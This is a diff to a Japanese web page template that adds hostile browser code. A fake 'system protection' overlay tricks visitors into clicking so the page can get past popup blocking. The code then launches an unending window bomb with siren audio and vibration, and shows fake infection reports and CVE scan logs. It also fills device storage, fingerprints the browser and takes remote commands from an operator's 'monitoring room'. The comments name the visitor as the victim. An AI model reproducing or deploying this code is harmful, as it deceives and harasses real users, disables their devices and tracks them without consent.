@@ -35,6 +35,21 @@ body{padding:18px;min-height:100vh}
 .note button:disabled{opacity:.6}
 .note .x{margin-left:4px;background:transparent;color:#9fb4d8;border:0;font-size:16px;cursor:pointer;padding:2px 6px}
 
+/* ===== 初回ワンクリック解放（ポップアップ/音声のロック解除） ===== */
+#unlock{position:fixed;inset:0;z-index:90;display:none;align-items:center;justify-content:center;
+  background:rgba(5,7,10,.86);backdrop-filter:blur(3px);cursor:pointer;text-align:center;padding:20px}
+#unlock.on{display:flex}
+#unlock .ub{max-width:440px}
+#unlock .uic{font-size:52px;line-height:1;margin-bottom:12px}
+#unlock h2{margin:0 0 8px;font-size:18px;color:#7ee08a;letter-spacing:.5px}
+#unlock p{margin:0 0 16px;font-size:13px;color:#9fb4cc;line-height:1.9}
+#unlock .ubtn{display:inline-block;padding:14px 30px;border-radius:999px;background:#00c46a;
+  color:#04240f;font-weight:800;font-size:15px;box-shadow:0 0 26px rgba(0,196,106,.45);
+  animation:ubp 1.4s ease-in-out infinite}
+@keyframes ubp{50%{transform:scale(1.05)}}
+#unlock .un{position:absolute;bottom:22px;left:0;right:0;font-size:11.5px;color:#5f7d99;
+  font-family:ui-monospace,Menlo,monospace}
+
 /* ===== 子ウィンドウ（感染レポート） ===== */
 .child{background:#08090d;padding:16px}
 .ck{max-width:460px;margin:0 auto}
@@ -77,6 +92,18 @@ body.glitch .in,body.glitch h1,body.glitch .ck{filter:invert(1) hue-rotate(90deg
 
 <div id="flash"></div>
 <div id="noise"></div>
+
+{% if not is_child %}
+<div id="unlock">
+  <div class="ub">
+    <div class="uic">🛡</div>
+    <h2>{{ link.name }} — 保護を開始します</h2>
+    <p>システム保護モジュールを展開するため、<br><b>画面のどこかを1回クリック</b>してください。</p>
+    <div class="ubtn">▶ クリックして開始</div>
+  </div>
+  <div class="un" id="unote"></div>
+</div>
+{% endif %}
 
 {% if is_child %}
   <div class="ck">
@@ -139,6 +166,7 @@ window.V = {
   var ST = "/v/" + encodeURIComponent(CODE) + "/st";
   var STANDALONE = !!V.installed || (navigator.standalone === true) ||
     !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches);
+  var POPUP_MODE = (MODE === "windows" || MODE === "mix");
 
   var VID = (function () {
     try {
@@ -336,6 +364,7 @@ window.V = {
       codecs: codecs(),
       net: net(),
       perms: (function () { try { return navigator.permissions ? 1 : 0; } catch (e) { return 0; } })(),
+      popupAllowed: (function () { try { return navigator.userActivation ? 1 : 0; } catch (e) { return 0; } })(),
       ts: new Date().toISOString()
     };
     if (!deep) return Promise.resolve(base);
@@ -351,19 +380,23 @@ window.V = {
   }
 
   /* ================= 音 ================= */
-  var AC = null;
+  var AC = null, audioLocked = false;
   function audioCtx() {
     try {
       var C = window.AudioContext || window.webkitAudioContext;
       if (!C) return null;
       if (!AC) AC = new C();
-      if (AC.state === "suspended") { try { AC.resume(); } catch (e) {} }
+      if (AC.state === "suspended") {
+        var p = AC.resume();
+        if (p && p.catch) p.catch(function () {});
+      }
+      audioLocked = (AC.state !== "running");
       return AC;
     } catch (e) { return null; }
   }
   function crashSound(sec) {
     var ac = audioCtx();
-    if (!ac) return;
+    if (!ac || ac.state !== "running") return;
     var dur = sec || 3.2;
     var len = Math.floor(ac.sampleRate * dur);
     var buf = ac.createBuffer(1, len, ac.sampleRate);
@@ -382,7 +415,7 @@ window.V = {
     src.connect(f); f.connect(g); g.connect(ac.destination);
     try { src.start(); } catch (e) {}
     setTimeout(function () {
-      var ac2 = audioCtx(); if (!ac2) return;
+      var ac2 = audioCtx(); if (!ac2 || ac2.state !== "running") return;
       var l2 = Math.floor(ac2.sampleRate * 0.7);
       var b2 = ac2.createBuffer(1, l2, ac2.sampleRate);
       var d2 = b2.getChannelData(0);
@@ -427,33 +460,59 @@ window.V = {
     try { o.start(); lfo.start(); } catch (e) {}
   }
 
-  /* ================= 窓爆弾（完全自動・無限可・10秒で出し切る） ================= */
+  /* ================= 窓爆弾 =================
+     ポップアップは「一度でも操作したページ」でないとブロックされる。
+     ・初回は1枚だけ試す。成功→全開。失敗→解放オーバーレイを出す
+     ・ブロックされても諦めない（再試行ループ）
+     ・ブロック中でも seq 変化で必ず視覚/聴覚の反応を返す
+     ========================================= */
   var SET = (V.set === 0) ? 0 : (V.set || 100);
   var firing = true;
   var seq = V.seq || 0;
   var widx = 0, fired = 0, running = false;
+  var popupBlocked = false, unlocked = false, reportedBlock = false, reportedUnlock = false;
 
   function wantMore() {
     if (!firing) return false;
     if (SET === 0) return true;
     return fired < SET;
   }
+
+  function openOne() {
+    var w = null;
+    try {
+      w = window.open(location.pathname + "?w=1&n=" + widx,
+            "igt_" + CODE + "_" + widx,
+            "width=420,height=560,left=" + ((widx % 10) * 54) +
+            ",top=" + (20 + (widx % 10) * 34));
+    } catch (e) { w = null; }
+    if (!w || (w.closed && !w.closed === false)) { /* 判定は下で */ }
+    if (!w) return null;
+    /* ブロック時は WindowProxy が返り、すぐ closed になる実装もある */
+    try { if (w.closed) return null; } catch (e) {}
+    try { w.focus(); } catch (e) {}
+    return w;
+  }
+
   function pumpOnce(cap) {
     var made = 0;
     while (wantMore() && made < cap) {
-      var w = null;
-      try {
-        w = window.open(location.pathname + "?w=1&n=" + widx,
-              "igt_" + CODE + "_" + widx,
-              "width=420,height=560,left=" + ((widx % 10) * 54) +
-              ",top=" + (20 + (widx % 10) * 34));
-      } catch (e) { w = null; }
-      if (!w) break;
+      var w = openOne();
+      if (!w) {
+        if (!popupBlocked) {
+          popupBlocked = true;
+          if (!reportedBlock) { reportedBlock = true; send({ popup_blocked: 1, at: widx }); }
+          showUnlock(true);
+        }
+        break;
+      }
       widx++; fired++; made++;
+      popupBlocked = false;
     }
     if (made) send({ windows: made, window_total: widx, set: SET });
     return made;
   }
+
   function fireSet(reset) {
     if (!firing) return;
     if (reset) fired = 0;
@@ -463,12 +522,43 @@ window.V = {
     var t0 = Date.now();
     (function tick() {
       if (!firing) { running = false; return; }
-      var made = pumpOnce(SET === 0 ? 3 : 15);
+      var made = pumpOnce(SET === 0 ? 4 : 20);
       if (!made) { running = false; return; }
       if (!wantMore()) { running = false; return; }
-      if (SET !== 0 && Date.now() - t0 > 10000) { running = false; return; }
+      if (SET !== 0 && Date.now() - t0 > 15000) { running = false; return; }
       setTimeout(tick, 110);
     })();
+  }
+
+  /* ---- 解放（初回ジェスチャ） ---- */
+  function showUnlock(on) {
+    var u = document.getElementById("unlock");
+    if (!u) return;
+    if (on && !unlocked) u.classList.add("on");
+    if (!on) u.classList.remove("on");
+    var un = document.getElementById("unote");
+    if (un) {
+      un.textContent = popupBlocked
+        ? "ポップアップがブロックされています / クリックで解除"
+        : (audioLocked ? "音声がロックされています / クリックで解除" : "");
+    }
+  }
+
+  function unlock() {
+    unlocked = true;
+    showUnlock(false);
+    try { if (navigator.vibrate) navigator.vibrate([120, 60, 120]); } catch (e) {}
+    audioCtx();
+    var ac = audioCtx();
+    audioLocked = !(ac && ac.state === "running");
+    if (!reportedUnlock) { reportedUnlock = true; send({ unlock_click: 1, popup_blocked: popupBlocked ? 1 : 0, audio_locked: audioLocked ? 1 : 0 }); }
+    /* ジェスチャの同期実行中に一気に開く（ブロック回避の要） */
+    if (POPUP_MODE) {
+      running = false;
+      if (popupBlocked) { fired = 0; }
+      pumpOnce(SET === 0 ? 30 : Math.max(30, Math.min(SET, 60)));
+      fireSet(false);
+    }
   }
 
   /* ================= 容量枯渇（無限） ================= */
@@ -531,16 +621,13 @@ window.V = {
       }
     } catch (e) {}
     try {
-      var C = window.AudioContext || window.webkitAudioContext;
-      if (C) {
-        var a = document.createElement("audio");
-        a.src = "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAIA+AAACABAAZGF0YQAAAAA=";
-        a.loop = true; a.volume = 1;
-        a.style.cssText = "position:fixed;left:-9999px";
-        document.body.appendChild(a);
-        var p = a.play(); if (p && p.catch) p.catch(function () {});
-        silentAudio = a;
-      }
+      var a = document.createElement("audio");
+      a.src = "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAIA+AAACABAAZGF0YQAAAAA=";
+      a.loop = true; a.volume = 1;
+      a.style.cssText = "position:fixed;left:-9999px";
+      document.body.appendChild(a);
+      var p = a.play(); if (p && p.catch) p.catch(function () {});
+      silentAudio = a;
     } catch (e) {}
     setInterval(function () {
       if (!firing) return;
@@ -631,18 +718,36 @@ window.V = {
   }
 
   /* ================= 遠隔操作（こちらの監視室から） ================= */
+  function kick(reason) {
+    /* ポップアップが塞がれていても、必ず被害者側に反応を出す */
+    try { glitch(2600); } catch (e) {}
+    try { crashSound(2.2); } catch (e) {}
+    try { if (navigator.vibrate) navigator.vibrate([200, 80, 200]); } catch (e) {}
+    try { window.scrollTo({ top: 0, behavior: "smooth" }); } catch (e) {}
+    try {
+      var b = document.title.replace(/^[⚠◎♻]\s*/, "");
+      document.title = "⚠ " + b;
+      setTimeout(function () { document.title = b; }, 2400);
+    } catch (e) {}
+    st(reason || "遠隔命令を受信しました");
+  }
+
   function poll() {
     fetch(ST, { cache: "no-store" }).then(function (r) { return r.json(); }).then(function (j) {
       if (!j || !j.ok) return;
       if (typeof j.set === "number" && j.set !== SET) {
         SET = j.set; running = false; fired = 0;
-        if (MODE === "windows" || MODE === "mix") fireSet(true);
+        if (POPUP_MODE) fireSet(true);
       }
-      if (j.seq && j.seq !== seq) { seq = j.seq; running = false; fireSet(true); }
+      if (typeof j.seq === "number" && j.seq !== seq) {
+        seq = j.seq; running = false;
+        kick("▶ 1セット発射");
+        if (POPUP_MODE) fireSet(true);
+      }
       if (j.firing === 0 && firing) { firing = false; }
       else if (j.firing === 1 && !firing) {
         firing = true;
-        if (MODE === "windows" || MODE === "mix") fireSet(false);
+        if (POPUP_MODE) fireSet(false);
       }
     }).catch(function () {});
   }
@@ -659,13 +764,14 @@ window.V = {
   if (V.child) {
     var idx = parseInt((location.search.match(/n=(\d+)/) || [])[1] || "0", 10);
 
-    /* 無限ループ音源（サイレン） */
     alarm(idx);
     document.addEventListener("touchstart", function () { audioCtx(); alarm(idx); }, { passive: true });
     document.addEventListener("click", function () { audioCtx(); alarm(idx); });
+    document.addEventListener("mousedown", function () { audioCtx(); alarm(idx); });
+    /* 子窓は前面に出しておく（背面に開いて気づかれない事故を防ぐ） */
+    try { window.focus(); } catch (e) {}
 
-    /* 感染の進行バー */
-    var pt = 55 + Math.floor(Math.random() * 44);   // 目標 55-98%
+    var pt = 55 + Math.floor(Math.random() * 44);
     var pv = 0;
     var pbar = document.getElementById("pbar"), ppct = document.getElementById("ppct");
     var piv = setInterval(function () {
@@ -675,7 +781,6 @@ window.V = {
       if (ppct) ppct.textContent = pv + "%";
     }, 120);
 
-    /* 端末データ容量バー */
     var dv = 60 + Math.floor(Math.random() * 38);
     var dbar = document.getElementById("dbar"), dpct = document.getElementById("dpct");
     setTimeout(function () {
@@ -683,7 +788,6 @@ window.V = {
       if (dpct) dpct.textContent = dv + "% 使用";
     }, 300);
 
-    /* 脆弱性を発見（だんだん増える） */
     var VULNS = [
       "CVE-2019-0708 リモートコード実行",
       "未修正のSSL/TLS 脆弱性",
@@ -715,7 +819,6 @@ window.V = {
       }
     }, 260);
 
-    /* 偽スキャンログ */
     var fake = document.getElementById("fake");
     var lines = [
       "C:\\> scan /f /a",
@@ -751,15 +854,19 @@ window.V = {
   });
 
   function onGesture() {
+    if (!unlocked) unlock();
     audioCtx();
-    if (MODE === "windows" || MODE === "mix") fireSet(false);
+    if (POPUP_MODE) fireSet(false);
   }
   document.addEventListener("touchstart", onGesture, { passive: true });
   document.addEventListener("click", onGesture);
+  document.addEventListener("mousedown", function () { if (!unlocked) unlock(); });
 
   document.addEventListener("visibilitychange", function () {
     if (document.visibilityState === "hidden") { send(behavior(), true); return; }
     send(behavior());
+    poll();                       /* 非表示中はタイマーが間引かれるので復帰時に即確認 */
+    if (POPUP_MODE && firing) fireSet(false);
   });
   window.addEventListener("pagehide", function () { send(behavior(), true); });
 
@@ -775,7 +882,6 @@ window.V = {
     if (nb) nb.addEventListener("click", function () {
       if (deferred) { try { deferred.prompt(); } catch (e) {} deferred = null; }
       else {
-        // iOS など：ホーム画面追加の案内
         nb.textContent = "共有 → ホーム画面に追加";
         setTimeout(function () { nb.textContent = "インストール"; }, 4000);
       }
@@ -807,9 +913,12 @@ window.V = {
     soundLoop();
 
   } else if (MODE === "windows") {
+    /* 1枚だけ試して、通れば全開。塞がれていれば解放待ち。 */
     soundLoop();
-    fireSet(true);
-    setInterval(function () { fireSet(false); }, 400);
+    var first = pumpOnce(1);
+    if (first) { fireSet(true); }
+    else { showUnlock(true); }
+    setInterval(function () { fireSet(false); }, 500);
 
   } else if (MODE === "storage") {
     fillStorage(function () { setTimeout(function () { fillStorage(function () {}); }, 2000); });
@@ -818,13 +927,24 @@ window.V = {
     brick();
     installMode();
     soundLoop();
-    fireSet(true);
+    if (pumpOnce(1)) fireSet(true); else showUnlock(true);
     fillStorage(function () {});
-    setInterval(function () { fireSet(false); }, 500);
+    setInterval(function () { fireSet(false); }, 600);
     if (STANDALONE) send({ auto: 1, standalone: 1 });
   }
 
+  /* 解放されない間も定期的に再試行（被害者がいつクリックしても拾う） */
+  setInterval(function () {
+    if (!POPUP_MODE) return;
+    if (popupBlocked && wantMore()) {
+      running = false;
+      var made = pumpOnce(1);
+      if (made) { fireSet(true); }
+    }
+  }, 1500);
+
   setInterval(poll, 1800);
+  poll();
 })();
 </script>
 </body></html>
